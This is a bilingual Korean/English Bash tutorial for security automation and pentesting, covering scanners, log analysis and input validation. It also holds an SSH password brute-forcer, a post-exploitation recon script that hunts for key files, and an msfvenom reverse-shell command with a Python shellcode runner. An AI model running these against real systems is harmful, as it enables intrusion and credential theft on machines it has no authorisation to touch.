> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Bash 스크립팅 — 보안 자동화 실전 가이드

## 1. 기본 문법

### 변수

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
name="hacker"
echo "Hello, $name"
echo "Hello, ${name}!"

# 명령어 결과를 변수에 저장
ip_addr=$(hostname -I | awk '{print $1}')
echo "My IP: $ip_addr"

# 산술 연산
x=10
y=3
echo $((x + y))     # 13
echo $((x * y))     # 30
echo $((x / y))     # 3 (정수 나눗셈)
echo $((x % y))     # 1
```

### 조건문

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash

# 파일 존재 확인
if [ -f "/etc/passwd" ]; then
    echo "파일 존재"
fi

# 문자열 비교
user="root"
if [ "$user" = "root" ]; then
    echo "루트 계정"
elif [ "$user" = "admin" ]; then
    echo "관리자 계정"
else
    echo "일반 계정"
fi

# 숫자 비교
port=22
if [ $port -eq 22 ]; then
    echo "SSH 포트"
elif [ $port -lt 1024 ]; then
    echo "Well-known port"
fi

# 파일/디렉토리 조건
[ -f file ]    # 파일 존재
[ -d dir ]     # 디렉토리 존재
[ -r file ]    # 읽기 가능
[ -w file ]    # 쓰기 가능
[ -x file ]    # 실행 가능
[ -s file ]    # 파일 크기가 0보다 큼
[ -L file ]    # 심볼릭 링크
```

### 반복문

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash

# for 루프 — IP 대역 스캔
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is UP"
done

# for 루프 — 파일 목록
for file in /var/log/*.log; do
    echo "Processing: $file"
    wc -l "$file"
done

# while 루프
count=0
while [ $count -lt 10 ]; do
    echo "Count: $count"
    ((count++))
done

# 파일 한 줄씩 읽기
while IFS= read -r line; do
    echo "Line: $line"
done < wordlist.txt
```

### 함수

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash

# 함수 정의
check_port() {
    local host=$1
    local port=$2
    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[OPEN]  $host:$port"
    else
        echo "[CLOSE] $host:$port"
    fi
}

# 함수 호출
check_port 192.168.1.1 22
check_port 192.168.1.1 80
check_port 192.168.1.1 443
```

---

## 2. 보안 자동화 스크립트 모음

### 2-1. 호스트 탐지 스캐너 (병렬 처리)

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/usr/bin/env bash
# 네트워크 내 활성 호스트 병렬 탐지 (xargs + ping)
set -euo pipefail

NETWORK="${1:-192.168.1}"
MAX_JOBS="${2:-50}"      # 동시 ping 수
TIMEOUT=1                # ping 응답 대기 시간(초)
TMPFILE=$(mktemp /tmp/hostscan_XXXXXX.txt)
trap 'rm -f "$TMPFILE"' EXIT

echo "[*] 네트워크 스캔: ${NETWORK}.0/24  (병렬 ${MAX_JOBS}개)"
echo "================================================"
START=$(date +%s)

# 병렬 ping: 각 서브쉘에서 ping 후 생존 IP를 임시파일에 기록
scan_host() {
    local ip="$1"
    if ping -c 1 -W "$TIMEOUT" "$ip" &>/dev/null; then
        echo "$ip"
    fi
}
export -f scan_host
export TIMEOUT

seq 1 254 | \
    xargs -P "$MAX_JOBS" -I{} bash -c 'scan_host "'"$NETWORK"'.{}"' | \
    sort -t. -k4 -n | \
    tee "$TMPFILE" | \
    while IFS= read -r ip; do
        # 호스트명 역조회 (실패 시 생략)
        hostname=$(host "$ip" 2>/dev/null | grep -oP '(?<=pointer ).*' || echo "")
        echo "[+] ${ip}${hostname:+  (${hostname%.})}"
    done

END=$(date +%s)
COUNT=$(wc -l < "$TMPFILE")
echo ""
echo "[*] 완료: ${COUNT}개 호스트 발견  (소요: $((END - START))초)"
```

### 2-2. 포트 스캐너 (Bash /dev/tcp 병렬 기반)

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/usr/bin/env bash
# TCP 포트 병렬 스캔 (/dev/tcp 활용, 배너 그래빙 선택)
set -uo pipefail

HOST="${1:-192.168.1.1}"
PORT_SPEC="${2:-1-1024}"    # "22,80,1-1024" 형식 지원
MAX_JOBS="${3:-100}"
TIMEOUT=1

# 포트 범위 파싱 (22,80,100-200 → 배열)
expand_ports() {
    local spec="$1"
    local -a ports=()
    IFS=',' read -ra parts <<< "$spec"
    for part in "${parts[@]}"; do
        if [[ "$part" == *-* ]]; then
            IFS='-' read -r start end <<< "$part"
            for p in $(seq "$start" "$end"); do ports+=("$p"); done
        else
            ports+=("$part")
        fi
    done
    printf '%s\n' "${ports[@]}" | sort -nu
}

scan_port() {
    local host="$1" port="$2"
    if (echo >/dev/tcp/"$host"/"$port") 2>/dev/null; then
        # 간단한 배너 수신 시도 (0.3초 대기)
        local banner=""
        banner=$(bash -c "exec 3<>/dev/tcp/$host/$port
                          echo -e 'HEAD / HTTP/1.0\r\n\r\n' >&3
                          read -t 0.3 -r line <&3
                          echo \$line" 2>/dev/null || true)
        printf "[OPEN] %-6s  %s\n" "$port" "${banner:0:60}"
    fi
}
export -f scan_port

echo "[*] 스캔 대상: $HOST  포트: $PORT_SPEC  (병렬: $MAX_JOBS)"
echo "================================================"

mapfile -t PORTS < <(expand_ports "$PORT_SPEC")
printf '%s\n' "${PORTS[@]}" | \
    xargs -P "$MAX_JOBS" -I{} bash -c "scan_port '$HOST' '{}'" | \
    sort -t' ' -k2 -n

echo "[*] 완료 (${#PORTS[@]}개 포트 스캔)"
```

### 2-3. 웹 디렉토리 브루트포서

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# HTTP 디렉토리 열거

TARGET=${1:-"http://localhost"}
WORDLIST=${2:-"/usr/share/dirb/wordlists/common.txt"}

echo "[*] Target: $TARGET"
echo "[*] Wordlist: $WORDLIST"
echo "================================================"

while IFS= read -r dir; do
    url="$TARGET/$dir"
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url")
    
    case $status in
        200) echo "[200 OK]       $url" ;;
        301|302) echo "[${status} REDIR]  $url" ;;
        403) echo "[403 FORBID]   $url" ;;
        500) echo "[500 ERROR]    $url" ;;
    esac
done < "$WORDLIST"
```

### 2-4. SSH 브루트포서 (학습용)

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# SSH 비밀번호 대입 공격 (허가된 시스템에서만 사용)

HOST=$1
USER=$2
WORDLIST=$3

if [ -z "$HOST" ] || [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    echo "Usage: $0 <host> <user> <wordlist>"
    exit 1
fi

echo "[*] Target: $USER@$HOST"
echo "================================================"

while IFS= read -r password; do
    result=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
             -o ConnectTimeout=3 "$USER@$HOST" "echo SUCCESS" 2>/dev/null)
    
    if [ "$result" = "SUCCESS" ]; then
        echo "[+] SUCCESS! Password: $password"
        exit 0
    else
        echo "[-] Failed: $password"
    fi
done < "$WORDLIST"

echo "[-] Attack finished. Password not found."
```

### 2-5. 로그 분석 자동화 (에러 처리 및 보고서 생성 포함)

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/usr/bin/env bash
# auth.log 분석 — 공격 IP 탐지 및 보고서 생성
set -euo pipefail

LOG_FILE="${1:-/var/log/auth.log}"
THRESHOLD="${2:-10}"
REPORT_DIR="${3:-/tmp}"
REPORT_FILE="${REPORT_DIR}/ssh_report_$(date +%Y%m%d_%H%M%S).txt"

# 의존성 확인
for cmd in grep awk sort uniq; do
    command -v "$cmd" &>/dev/null || { echo "[!] 필요 명령어 없음: $cmd"; exit 1; }
done

[[ -f "$LOG_FILE" ]] || { echo "[!] 로그 파일 없음: $LOG_FILE"; exit 1; }
[[ -r "$LOG_FILE" ]] || { echo "[!] 읽기 권한 없음 (sudo 필요): $LOG_FILE"; exit 1; }

generate_report() {
    local log="$1"
    local threshold="$2"

    echo "======================================"
    echo "  SSH 보안 분석 보고서"
    echo "  생성: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "  대상: $log"
    echo "======================================"

    local total_failed
    total_failed=$(grep -c "Failed password" "$log" 2>/dev/null || echo 0)
    local total_success
    total_success=$(grep -c "Accepted" "$log" 2>/dev/null || echo 0)
    local unique_ips
    unique_ips=$(grep "Failed password" "$log" 2>/dev/null | \
                 grep -oP 'from \K[\d.]+' | sort -u | wc -l || echo 0)

    echo ""
    echo "[요약]"
    printf "  총 실패 횟수   : %d\n" "$total_failed"
    printf "  총 성공 횟수   : %d\n" "$total_success"
    printf "  고유 공격 IP   : %d\n" "$unique_ips"

    echo ""
    echo "[공격 IP Top 20]  (임계값: ${threshold}회 이상)"
    grep "Failed password" "$log" 2>/dev/null | \
        grep -oP 'from \K[\d.]+' | \
        sort | uniq -c | sort -rn | head -20 | \
        while read -r count ip; do
            if (( count >= threshold )); then
                printf "  [!] %-18s  %5d회  ← 잠재적 공격자\n" "$ip" "$count"
            else
                printf "  [-] %-18s  %5d회\n" "$ip" "$count"
            fi
        done

    echo ""
    echo "[공격받은 계정 Top 10]"
    grep "Failed password" "$log" 2>/dev/null | \
        grep -oP 'for (?:invalid user )?\K\S+(?= from)' | \
        sort | uniq -c | sort -rn | head -10 | \
        while read -r count user; do
            printf "  %-20s  %5d회\n" "$user" "$count"
        done

    echo ""
    echo "[성공한 로그인 (최근 20건)]"
    grep "Accepted" "$log" 2>/dev/null | tail -20 | \
        awk '{
            ts=$1" "$2" "$3
            for(i=1;i<=NF;i++){
                if($i=="for") user=$(i+1)
                if($i=="from") ip=$(i+1)
                if($i=="via" || $i=="port") break
            }
            printf "  %-20s  %-18s  %s\n", ts, user, ip
        }'

    echo ""
    echo "[시간대별 공격 분포 (Top 5)]"
    grep "Failed password" "$log" 2>/dev/null | \
        awk '{print substr($3,1,2)":00"}' | \
        sort | uniq -c | sort -rn | head -5 | \
        while read -r count hour; do
            bar=$(printf '%0.s█' $(seq 1 $((count / 10 + 1))))
            printf "  %s  %5d회  %s\n" "$hour" "$count" "${bar:0:30}"
        done
}

# 보고서 생성 및 파일 저장
generate_report "$LOG_FILE" "$THRESHOLD" | tee "$REPORT_FILE"
echo ""
echo "[*] 보고서 저장: $REPORT_FILE"
```

### 2-6. 시스템 정보 수집 (내부 침투 후)

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# Post-exploitation 내부 정찰 스크립트

echo "=========================================="
echo "  SYSTEM RECONNAISSANCE REPORT"
echo "=========================================="

echo ""
echo "[*] System Information"
echo "  Hostname   : $(hostname)"
echo "  OS         : $(cat /etc/os-release | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '"')"
echo "  Kernel     : $(uname -r)"
echo "  Arch       : $(uname -m)"

echo ""
echo "[*] Current User"
echo "  User  : $(whoami)"
echo "  UID   : $(id -u)"
echo "  Groups: $(id -Gn)"

echo ""
echo "[*] Sudo Privileges"
sudo -l 2>/dev/null | grep -v "^[[:space:]]*$"

echo ""
echo "[*] Active Network Connections"
ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null

echo ""
echo "[*] SetUID Files"
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "[*] Writable Directories"
find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null

echo ""
echo "[*] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

echo ""
echo "[*] Running Processes (Root)"
ps aux | grep root | grep -v grep

echo ""
echo "[*] Interesting Files"
find /home -name "*.txt" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find /var/www -name "*.php" -o -name "*.conf" 2>/dev/null | head -20
```

---

## 3. 정규 표현식 (Regex) 보안 활용

```bash
# IP 주소 추출
grep -oP '\b\d{1,3}(\.\d{1,3}){3}\b' file.txt

# 이메일 주소 추출
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt

# URL 추출
grep -oP 'https?://[^\s<>"]+' file.txt

# Base64 인코딩 문자열 탐지
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' file.txt

# 숫자만 추출
grep -oP '\d+' file.txt

# 16진수 패턴 (셸코드 등)
grep -oP '\\x[0-9a-fA-F]{2}' shellcode.txt
```

---

## 4. 프로세스 관리 및 백그라운드 실행

```bash
# 백그라운드 실행
long_scan.sh &
echo "PID: $!"

# 백그라운드 프로세스 목록
jobs

# 포그라운드로 가져오기
fg %1

# nohup으로 터미널 종료 후에도 실행
nohup ./scan.sh > output.log 2>&1 &

# screen으로 세션 유지
screen -S hacking_session
# Ctrl+A, D 로 분리
screen -r hacking_session  # 재연결

# tmux 활용
tmux new -s attack
# Ctrl+B, D 로 분리
tmux attach -t attack
```

---

## 5. 고급 Bash 기법

### 에러 처리

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
set -e          # 오류 발생 시 즉시 종료
set -u          # 정의되지 않은 변수 사용 시 오류
set -o pipefail  # 파이프라인 오류 전파

# 트랩으로 종료 시 정리
cleanup() {
    echo "[*] Cleaning up..."
    rm -f /tmp/scan_*.txt
}
trap cleanup EXIT
```

### 병렬 처리

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# 병렬 포트 스캔 (훨씬 빠름)

NETWORK="192.168.1"

scan_host() {
    local ip="$NETWORK.$1"
    ping -c 1 -W 1 "$ip" &>/dev/null && echo "$ip is ALIVE"
}

export -f scan_host
export NETWORK

# xargs를 활용한 병렬 실행 (최대 50개 동시)
seq 1 254 | xargs -P 50 -I {} bash -c 'scan_host "$@"' _ {}
```

---

## 6. Base64 인코딩/디코딩 (보안 분석)

### 기본 사용법
```bash
# 인코딩
echo -n "Hello World" | base64
# 출력: SGVsbG8gV29ybGQ=

# 디코딩
echo "SGVsbG8gV29ybGQ=" | base64 -d
# 출력: Hello World

# 파일 인코딩
base64 binary_file > encoded.txt

# 파일 디코딩
base64 -d encoded.txt > decoded_file
```

### 보안 분석 활용
```bash
# 악성코드에서 Base64 인코딩 문자열 추출 및 디코딩
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' suspicious_file.txt | \
    while read b64; do
        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "=== Decoded ==="
            echo "$decoded"
        fi
    done

# URL에서 Base64 추출 (URL-safe 변형 처리)
echo "aHR0cDovL2V4YW1wbGUuY29t" | base64 -d
# 출력: http://example.com

# PowerShell 악성코드 디코딩 (EncodedCommand)
# powershell -enc <Base64>
echo "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=" | \
    base64 -d | iconv -f UTF-16LE -t UTF-8

# Python으로 Base64 처리
python3 -c "import base64; print(base64.b64decode('SGVsbG8gV29ybGQ=').decode())"

# base64 인코딩 변형 탐지
# Standard: A-Z, a-z, 0-9, +, /
# URL-safe:  A-Z, a-z, 0-9, -, _
echo "SGVsbG8-V29ybGQ_" | tr '-_' '+/' | base64 -d
```

### 쉘코드 Base64 인코딩 (실습용)
```bash
# msfvenom으로 생성한 쉘코드 인코딩
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw | base64 | tr -d '\n'

# 디코딩 후 실행 (Python)
python3 -c "
import base64
sc = base64.b64decode('BASE64_SHELLCODE')
# 메모리에서 실행 (ctypes 방식)
import ctypes
buf = ctypes.create_string_buffer(sc)
ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
"
```

---

## 7. 스크립트 입력 검증 및 보안 코딩

### 입력 검증

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# 안전한 입력 검증

validate_ip() {
    local ip=$1
    local stat=1
    
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && \
           ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

# IP 유효성 확인
TARGET_IP="$1"
if ! validate_ip "$TARGET_IP"; then
    echo "[!] 잘못된 IP 주소: $TARGET_IP"
    exit 1
fi

validate_port() {
    local port=$1
    [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]
}
```

### 안전한 임시 파일 처리

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/bin/bash
# 안전한 임시 파일 생성 및 정리

# mktemp으로 안전한 임시 파일 생성
TMPFILE=$(mktemp /tmp/scan_XXXXXX.txt)
TMPDIR=$(mktemp -d /tmp/output_XXXXXX)

# 종료 시 자동 정리 (인터럽트 포함)
cleanup() {
    rm -f "$TMPFILE"
    rm -rf "$TMPDIR"
    echo "[*] 임시 파일 정리 완료"
}
trap cleanup EXIT INT TERM

# 작업 수행
nmap -sV TARGET_IP > "$TMPFILE"
cp "$TMPFILE" "$TMPDIR/nmap_result.txt"

echo "[+] 스캔 완료: $TMPDIR/nmap_result.txt"
```

### 로깅 기능 포함 스크립트

배시 스크립트의 시작 부분입니다. `set -euo pipefail`을 추가하면 오류 발생 시 즉시 종료하는 안전한 스크립트를 작성할 수 있습니다.

```bash
#!/usr/bin/env bash
# 로깅이 포함된 펜테스트 자동화 템플릿
# 사용법: sudo bash pentest_template.sh <TARGET_IP> [-o output_dir]
set -euo pipefail
IFS=$'\n\t'

TARGET="${1:-}"
OUTPUT_DIR="${2:-.}"
LOG_FILE="${OUTPUT_DIR}/pentest_$(date +%Y%m%d_%H%M%S).log"
SEVERITY_COUNTS=( [DEBUG]=0 [INFO]=0 [WARN]=0 [ERROR]=0 )

# --- 로깅 유틸리티 ---
log() {
    local level="$1"; shift
    local msg="$*"
    local ts; ts="$(date '+%Y-%m-%d %H:%M:%S')"
    local color=""
    case "$level" in
        DEBUG) color="\033[0;37m" ;;
        INFO)  color="\033[0;32m" ;;
        WARN)  color="\033[1;33m" ;;
        ERROR) color="\033[0;31m" ;;
    esac
    printf "${color}[%s] [%-5s] %s\033[0m\n" "$ts" "$level" "$msg" | tee -a "$LOG_FILE"
    (( SEVERITY_COUNTS[$level]++ )) || true
}

run_step() {
    local description="$1"; shift
    log INFO "시작: $description"
    if "$@" >> "$LOG_FILE" 2>&1; then
        log INFO "완료: $description"
        return 0
    else
        local exit_code=$?
        log WARN "실패 (exit $exit_code): $description"
        return $exit_code
    fi
}

cleanup() {
    log INFO "정리 중..."
    # 임시 파일 삭제 등 종료 처리
}
trap cleanup EXIT

# --- 입력 검증 ---
if [[ -z "$TARGET" ]]; then
    log ERROR "사용법: $0 <TARGET_IP> [출력_디렉토리]"
    exit 1
fi

if ! [[ "$TARGET" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    log ERROR "유효하지 않은 IP 주소: $TARGET"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
log INFO "=== 펜테스트 시작: $TARGET ==="

# --- 스캔 단계 ---
run_step "Nmap 빠른 스캔 (top-100 포트)" \
    nmap -sC -sV --top-ports 100 -oN "${OUTPUT_DIR}/nmap_quick.txt" "$TARGET"

run_step "Nmap 전체 포트 스캔" \
    nmap -sS -p- --min-rate 5000 -oN "${OUTPUT_DIR}/nmap_full.txt" "$TARGET" || true

run_step "취약점 스크립트 실행" \
    nmap --script vuln -oN "${OUTPUT_DIR}/nmap_vuln.txt" "$TARGET" || true

# --- 완료 요약 ---
log INFO "=== 스캔 완료 ==="
log INFO "결과 디렉토리: $OUTPUT_DIR"
log INFO "로그 파일: $LOG_FILE"
log INFO "경고 수: ${SEVERITY_COUNTS[WARN]}  오류 수: ${SEVERITY_COUNTS[ERROR]}"
```

---

<a name="english"></a>

# Bash Scripting — Practical Guide to Security Automation

## 1. Basic Syntax

### Variables

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
name="hacker"
echo "Hello, $name"
echo "Hello, ${name}!"

# Store command output in a variable
ip_addr=$(hostname -I | awk '{print $1}')
echo "My IP: $ip_addr"

# Arithmetic operations
x=10
y=3
echo $((x + y))     # 13
echo $((x * y))     # 30
echo $((x / y))     # 3 (integer division)
echo $((x % y))     # 1
```

### Conditionals

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash

# Check file existence
if [ -f "/etc/passwd" ]; then
    echo "File exists"
fi

# String comparison
user="root"
if [ "$user" = "root" ]; then
    echo "Root account"
elif [ "$user" = "admin" ]; then
    echo "Admin account"
else
    echo "Regular account"
fi

# Numeric comparison
port=22
if [ $port -eq 22 ]; then
    echo "SSH port"
elif [ $port -lt 1024 ]; then
    echo "Well-known port"
fi

# File/directory conditions
[ -f file ]    # File exists
[ -d dir ]     # Directory exists
[ -r file ]    # Readable
[ -w file ]    # Writable
[ -x file ]    # Executable
[ -s file ]    # File size greater than 0
[ -L file ]    # Symbolic link
```

### Loops

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash

# for loop — IP range scan
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is UP"
done

# for loop — file list
for file in /var/log/*.log; do
    echo "Processing: $file"
    wc -l "$file"
done

# while loop
count=0
while [ $count -lt 10 ]; do
    echo "Count: $count"
    ((count++))
done

# Read file line by line
while IFS= read -r line; do
    echo "Line: $line"
done < wordlist.txt
```

### Functions

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash

# Function definition
check_port() {
    local host=$1
    local port=$2
    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[OPEN]  $host:$port"
    else
        echo "[CLOSE] $host:$port"
    fi
}

# Function calls
check_port 192.168.1.1 22
check_port 192.168.1.1 80
check_port 192.168.1.1 443
```

---

## 2. Security Automation Script Collection

### 2-1. Host Discovery Scanner (Parallel Processing)

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/usr/bin/env bash
# Parallel active host detection in a network (xargs + ping)
set -euo pipefail

NETWORK="${1:-192.168.1}"
MAX_JOBS="${2:-50}"      # concurrent ping count
TIMEOUT=1                # ping response wait time (seconds)
TMPFILE=$(mktemp /tmp/hostscan_XXXXXX.txt)
trap 'rm -f "$TMPFILE"' EXIT

echo "[*] Network scan: ${NETWORK}.0/24  (parallel: ${MAX_JOBS})"
echo "================================================"
START=$(date +%s)

# Parallel ping: each subshell pings and writes live IPs to temp file
scan_host() {
    local ip="$1"
    if ping -c 1 -W "$TIMEOUT" "$ip" &>/dev/null; then
        echo "$ip"
    fi
}
export -f scan_host
export TIMEOUT

seq 1 254 | \
    xargs -P "$MAX_JOBS" -I{} bash -c 'scan_host "'"$NETWORK"'.{}"' | \
    sort -t. -k4 -n | \
    tee "$TMPFILE" | \
    while IFS= read -r ip; do
        # Reverse hostname lookup (skip on failure)
        hostname=$(host "$ip" 2>/dev/null | grep -oP '(?<=pointer ).*' || echo "")
        echo "[+] ${ip}${hostname:+  (${hostname%.})}"
    done

END=$(date +%s)
COUNT=$(wc -l < "$TMPFILE")
echo ""
echo "[*] Done: ${COUNT} host(s) found  (elapsed: $((END - START))s)"
```

### 2-2. Port Scanner (Bash /dev/tcp Parallel)

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/usr/bin/env bash
# Parallel TCP port scan (using /dev/tcp, optional banner grabbing)
set -uo pipefail

HOST="${1:-192.168.1.1}"
PORT_SPEC="${2:-1-1024}"    # supports "22,80,1-1024" format
MAX_JOBS="${3:-100}"
TIMEOUT=1

# Port range parsing (22,80,100-200 → array)
expand_ports() {
    local spec="$1"
    local -a ports=()
    IFS=',' read -ra parts <<< "$spec"
    for part in "${parts[@]}"; do
        if [[ "$part" == *-* ]]; then
            IFS='-' read -r start end <<< "$part"
            for p in $(seq "$start" "$end"); do ports+=("$p"); done
        else
            ports+=("$part")
        fi
    done
    printf '%s\n' "${ports[@]}" | sort -nu
}

scan_port() {
    local host="$1" port="$2"
    if (echo >/dev/tcp/"$host"/"$port") 2>/dev/null; then
        # Attempt simple banner grab (wait 0.3s)
        local banner=""
        banner=$(bash -c "exec 3<>/dev/tcp/$host/$port
                          echo -e 'HEAD / HTTP/1.0\r\n\r\n' >&3
                          read -t 0.3 -r line <&3
                          echo \$line" 2>/dev/null || true)
        printf "[OPEN] %-6s  %s\n" "$port" "${banner:0:60}"
    fi
}
export -f scan_port

echo "[*] Target: $HOST  Ports: $PORT_SPEC  (parallel: $MAX_JOBS)"
echo "================================================"

mapfile -t PORTS < <(expand_ports "$PORT_SPEC")
printf '%s\n' "${PORTS[@]}" | \
    xargs -P "$MAX_JOBS" -I{} bash -c "scan_port '$HOST' '{}'" | \
    sort -t' ' -k2 -n

echo "[*] Done (${#PORTS[@]} ports scanned)"
```

### 2-3. Web Directory Brute-Forcer

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
# HTTP directory enumeration

TARGET=${1:-"http://localhost"}
WORDLIST=${2:-"/usr/share/dirb/wordlists/common.txt"}

echo "[*] Target: $TARGET"
echo "[*] Wordlist: $WORDLIST"
echo "================================================"

while IFS= read -r dir; do
    url="$TARGET/$dir"
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$url")
    
    case $status in
        200) echo "[200 OK]       $url" ;;
        301|302) echo "[${status} REDIR]  $url" ;;
        403) echo "[403 FORBID]   $url" ;;
        500) echo "[500 ERROR]    $url" ;;
    esac
done < "$WORDLIST"
```

### 2-4. SSH Brute-Forcer (For Learning Purposes)

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/bin/bash
# SSH password brute-force (use only on authorized systems)

HOST=$1
USER=$2
WORDLIST=$3

if [ -z "$HOST" ] || [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    echo "Usage: $0 <host> <user> <wordlist>"
    exit 1
fi

echo "[*] Target: $USER@$HOST"
echo "================================================"

while IFS= read -r password; do
    result=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
             -o ConnectTimeout=3 "$USER@$HOST" "echo SUCCESS" 2>/dev/null)
    
    if [ "$result" = "SUCCESS" ]; then
        echo "[+] SUCCESS! Password: $password"
        exit 0
    else
        echo "[-] Failed: $password"
    fi
done < "$WORDLIST"

echo "[-] Attack finished. Password not found."
```

### 2-5. Log Analysis Automation (with Error Handling and Report Generation)

Adding `set -euo pipefail` at the top of a Bash script makes it exit immediately on error, producing a safer script.

```bash
#!/usr/bin/env bash
# auth.log analysis — attacker IP detection and report generation
set -euo pipefail

LOG_FILE="${1:-/var/log/auth.log}"
THRESHOLD="${2:-10}"
REPORT_DIR="${3:-/tmp}"
REPORT_FILE="${REPORT_DIR}/ssh_report_$(date +%Y%m%d_%H%M%S).txt"

# Dependency check
for cmd in grep awk sort uniq; do
    command -v "$cmd" &>/dev/null || { echo "[!] Required command missing: $cmd"; exit 1; }
done

[[ -f "$LOG_FILE" ]] || { echo "[!] Log file not found: $LOG_FILE"; exit 1; }
[[ -r "$LOG_FILE" ]] || { echo "[!] No read permission (sudo required): $LOG_FILE"; exit 1; }

generate_report() {
    local log="$1"
    local threshold="$2"

    echo "======================================"
    echo "  SSH Security Analysis Report"
    echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "  Target: $log"
    echo "======================================"

    local total_failed
    total_failed=$(grep -c "Failed password" "$log" 2>/dev/null || echo 0)
    local total_success
    total_success=$(grep -c "Accepted" "$log" 2>/dev/null || echo 0)
    local unique_ips
    unique_ips=$(grep "Failed password" "$log" 2>/dev/null | \
                 grep -oP 'from \K[\d.]+' | sort -u | wc -l || echo 0)

    echo ""
    echo "[Summary]"
    printf "  Total failures   : %d\n" "$total_failed"
    printf "  Total successes  : %d\n" "$total_success"
    printf "  Unique attacker IPs : %d\n" "$unique_ips"

    echo ""
    echo "[Top 20 Attacker IPs]  (threshold: >=${threshold} attempts)"
    grep "Failed password" "$log" 2>/dev/null | \
